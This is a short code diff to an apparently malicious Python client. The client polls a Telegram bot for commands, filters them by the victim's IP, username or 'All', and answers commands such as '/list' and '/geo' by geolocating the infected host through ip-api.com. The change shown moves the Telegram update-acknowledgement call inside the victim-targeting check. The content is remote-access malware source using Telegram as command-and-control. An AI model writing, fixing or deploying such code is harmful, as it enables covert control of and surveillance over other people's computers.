@@ -74,12 +74,12 @@ class Loader():
 			new_date = message['date']
 			if(old_date != new_date):
 				old_date = new_date
-				self.Request("https://api.telegram.org/bot" + self.token + "/getUpdates?offset=" + str(data['result'][-1]['update_id']))
 				if("text" in message.keys()):
 					command = message['text'].split(" ")[0]
 					if command == "/list":
 						self.SendNotification()
 					if (message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]):
+						self.Request("https://api.telegram.org/bot" + self.token + "/getUpdates?offset=" + str(data['result'][-1]['update_id']))
 						if command == "/geo":
 							data = json.loads(self.Request('http://ip-api.com/json/'))
 							message = "%F0%9F%8C%8E Geo Location : \n"
